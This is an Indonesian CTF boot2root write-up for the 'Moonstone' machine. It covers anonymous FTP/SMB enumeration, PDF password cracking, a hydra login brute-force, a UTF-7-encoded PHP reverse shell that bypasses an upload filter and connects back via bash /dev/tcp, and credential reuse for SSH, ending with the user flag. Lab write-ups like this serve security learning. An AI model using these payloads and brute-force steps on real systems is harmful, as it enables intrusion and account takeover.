# Moonstone

{% hint style="info" %}
Category: Boot2root

Difficulty: medium
{% endhint %}

## 1. Detail Tantangan

| Name       | Description           |
| ---------- | --------------------- |
| Level      | Moderate              |
| Points     | 50 (user) & 50 (root) |
| Machine IP | 10.1.2.232            |
| Machine OS | Linux                 |

## 2. Langkah Penyelesaian

### 2.1. Port and Service Enumeration

* Hasil port scanning menggunakan tool: `rustscan`.

```bash
rustscan -a 10.1.2.232 -r 1-65535 --scripts default | tee -a output_scan_all_ports.txt
```

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

### 2.2. FTP Enumeration

* Terdapat celah FTP misconfiguration, di mana attacker dapat login sebagai user `anonymous`.

```bash
ftp anonymous@10.1.2.232 # login without password.
```

* Terdapat 3 folder yang di dalamnya terdapat file-file yang interesting.

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

* Langsung saja saya download semua file di setiap foldernya. Total ada **6 file**, 3 di antaranya file zip dan 3 sisanya adalah file dummy SQL.

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

* Dari semua file tersebut, hanya ada 1 file zip yang bisa dibuka, yaitu: `YourSpace_Dev.zip`.
* Setelah diekstrak, muncul folder yang berisi source code **CodeIgniter 4** (lanjut ke bagian _**finding the secrets**_).

### 2.3. SMB Enumeration

* Karena port 445 terbuka dan terdapat celah dapat login sebagai anonymous, maka dari itu saya langsung coba melihat ada file apa saja di dalam shared folder `Backup`.

```bash
smbclient -L //10.1.2.232/Backup --option="client min protocol=SMB2"
```

* Setelah saya coba masuk ke shared folder `Backup`, terdapat folder baru yang sebelumnya tidak ada di FTP server, yaitu: `2024_07`.
* Di dalam folder tersebut, terdapat beberapa file tambahan yang cukup interesting.

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

* Tapi, hanya ada 1 file yang beneran bisa dibuka, yaitu: `Audit Report (3).pdf`.
* Masalahnya, file tersebut diproteksi oleh password, sehingga harus dibrute force menggunakan tool: `pdf2john`.

```bash
pdf2john "Audit Report (3).pdf" > audit_report_3.hash
```

* Setelah itu, tinggal crack saja menggunakan tool: `john`.

```bash
john --show --format=PDF audit_report_3.hash
```

* Found password for pdf file: `janganlupa`.

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* Setelah file pdf tersebut dibuka, di **halaman 5** (terakhir) terdapat daftar password yang mungkin berguna untuk nantinya.

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

### 2.4. RPC Enumeration

* Sama seperti challenge-challenge sebelumnya, kita bisa memanfaatkan celah null session pada RPC service untuk bisa melakukan enumerasi.
* Awalnya, ketika saya coba manual enumerasi user pada RPC service menggunakan perintah `enumdomusers`, hanya ada terdapat 7 user saja, tetapi ketika menggunakan tool: `enum4linux` terdapat 2 user baru, yaitu:
  * **jay\_payakumbuah**, dan
  * **ayyub**.
* Jadi, total ada **9 user** yang berguna untuk nantinya.

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

### 2.5. Finding the Secrets

* Diketahui bahwa aplikasi yang berjalan di port **8080** dan dibuat menggunakan **CodeIgniter 4** (PHP-based web framework).
* Ketika dibuka, muncul halaman login. Langsung saja saya coba brute force login http-form menggunakan informasi user dan password yang sudah diperoleh sebelumnya menggunakan tool: `hydra` dengan provide list user dan password yang telah diketahui sebelumnya.

{% tabs %}
{% tab title="users.txt" %}
```
ayyub
donghyuk_kim
yeji_hwang
azkira_kim
bryan_jung
nurul_lee
yuna_shin
hanbin_kim
jay_payakumbuah
```
{% endtab %}

{% tab title="pass.txt" %}
```
P@ssw0rd
T4da1mA!
Lzj*7BL%#fMhq
```
{% endtab %}
{% endtabs %}

* Berikut adalah full command hydra untuk bruteforce http form loginnya (bisa juga pakai NSE `http-form-brute` dari `nmap`).

```bash
hydra -L users.txt -P pass.txt -s 8080 10.1.2.232 http-post-form "/authenticate:username=^USER^&password=^PASS^:login_failed"
# You can check the path and login parameter by intercepting the traffic via burp suite.
```

* Terdapat beberapa file yang menarik perhatian saya, yaitu file `yourspace/.env` dan `yourspace/public/info.asp`.

{% tabs %}
{% tab title=".env" %}
```php
#--------------------------------------------------------------------
# Example Environment Configuration file
#
# This file can be used as a starting point for your own
# custom .env files, and contains most of the possible settings
# available in a default install.
#
# By default, all of the settings are commented out. If you want
# to override the setting, you must un-comment it by removing the '#'
# at the beginning of the line.
#--------------------------------------------------------------------

#--------------------------------------------------------------------
# ENVIRONMENT
#--------------------------------------------------------------------

CI_ENVIRONMENT = development

#--------------------------------------------------------------------
# APP
#--------------------------------------------------------------------

# app.baseURL = ''
# If you have trouble with `.`, you could also use `_`.
# app_baseURL = ''
# app.forceGlobalSecureRequests = false
# app.CSPEnabled = false

#--------------------------------------------------------------------
# DATABASE
#--------------------------------------------------------------------

database.default.hostname = localhost
database.default.database = yourspace
database.default.username = rafi
database.default.password = password
database.default.DBDriver = MySQLi
# database.default.DBPrefix =
database.default.port = 3306

# If you use MySQLi as tests, first update the values of Config\Database::$tests.
# database.tests.hostname = localhost
# database.tests.database = ci4_test
# database.tests.username = root
# database.tests.password = root
# database.tests.DBDriver = MySQLi
# database.tests.DBPrefix =
# database.tests.charset = utf8mb4
# database.tests.DBCollat = utf8mb4_general_ci
# database.tests.port = 3306

#--------------------------------------------------------------------
# ENCRYPTION
#--------------------------------------------------------------------

# encryption.key =

#--------------------------------------------------------------------
# SESSION
#--------------------------------------------------------------------

# session.driver = 'CodeIgniter\Session\Handlers\FileHandler'
# session.savePath = null

#--------------------------------------------------------------------
# LOGGER
#--------------------------------------------------------------------

# logger.threshold = 4
```
{% endtab %}

{% tab title="info.asp" %}
```php
<?php phpinfo(); ?>
```
{% endtab %}
{% endtabs %}

* Pada file `.env` terdapat kredensial database, tapi karena port 3306 tidak terbuka, maka dari itu, file tersebut tidak berguna untuk sekarang (mungkin ketika berhasil mendapatkan shell).
* Pada file `info.asp` berisikan fungsi `phpinfo()` untuk menampilkan informasi terkait versi PHP yang digunakan.

### 2.6. Gaining Access w/ PHP Reverse Shell

* Setelah berhasil login menggunakan username: `jay_payakumbuah` dengan password: `Lzj*7BL%#fMhq`, kemudian saya coba lihat isi di dalam webnya, ternyata ada satu fitur untuk upload sebuah dokumen yang bisa dimanfaatkan sebagai celah _**arbitrary file upload**_.
* Saya coba analisis lagi source code PHP yang tertera di folder `yourspace` sebelumnya.
* Setelah penantian cukup panjang, saya menyadari bahwa fitur tersebut pasti ada di sebuah **Controllers**, detailnya ada di file `MedicalController.php` (_lebih lengkapnya baca terkait arsitektur folder MVC pada framework CodeIgniter_).
* Terdapat limitasi pada fungsi upload file, yaitu:
  * Jika file yang di upload berekstensi **.php, .pht, atau .phtml**, maka terdeteksi sebagai malicious file.
  * Jika ada tag pembuka php (`<?`) di dalam konten yang di upload, maka terdeteksi juga sebagai malicious file.

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

* Untuk membypass hal tersebut, saya coba baca lagi informasi `http://10.1.2.232/info.asp` untuk melihat apakah ada celah yang bisa dimanfaatkan untuk bypass limitasi tadi.
* Ternyata, di bagian `zend.script_encoding` bisa juga menggunakan `UTF-7`, yang mana memungkinkan untuk untuk bisa mendapatkan reverse shell asal payloadnya dalam format `UTF-7`. Ini payload lengkapnya:

```php
+ADw-?php exec("bash -i +AD4-& /dev/tcp/10.18.200.127/4444 0+AD4-&1") ?+AD4-
```

* Untuk tanda `<` di-encode ke `UTF-7` menjadi: `+ADw-`. Dan tanda `>` menjadi: `+AD4-` (lebih lengkapnya baca artikel berikut: [https://stackoverflow.com/questions/77609263/convert-utf-8-to-utf-7-in-python](https://stackoverflow.com/questions/77609263/convert-utf-8-to-utf-7-in-python)).
* Tetapi, setelah coba di upload masih gagal, karena kenapa ? karena by default ekstensinya adalah `.asp` (agak menjengkelkan sih ini wkwk). Hal itu dibuktikan dengan fungsi `phpinfo()` yang tetap berjalan meskipun ekstensi filenya `.asp`.
* Oke fix upload dan jangan lupa untuk listen ke port `4444` menggunakan `nc`.

```bash
nc -lnvp 4444
```

* Kalau berhasil, maka kita berhasil mendapatkan **reverse shell**.

### 2.7. Remote SSH to Target Server

* Setelah berhasil masuk dengan reverse shell, current user pastinya adalah `www-data`.
* Saya coba cari flag usernya, ternyata flag ada di direktori `/home/ayyub/user.txt`.
* File tersebut memiliki permission `r-x,r--,---` (**540**) yang berarti **other tidak bisa membaca file tersebut**.
* Saya coba lakukan enumerasi secara manual dan terpikir untuk melihat file `.env` yang ada di remote server.

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

* Dari informasi kredensial database yang ada di file `.env`, saya mencoba untuk remote SSH menggunakan password yang tertera di file tersebut dan **Alhamdulillah**! saya berhasil login sebagai user `ayyub`.
  * **Username**: ayyub
  * **Password**: B6CHkw$5BTaN%
* Intinya, belum tentu kredensial database tersebut khusus untuk login ke db, bisa saja ke SSH atau service-service lain :).
* Berikut POC setelah saya berhasil remote SSH ke user `ayyub` dan mendapatkan flag usernya:

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

## 3. User Flag

<kbd>ab40b8d326bcddb72f674759d6c09ccc</kbd>
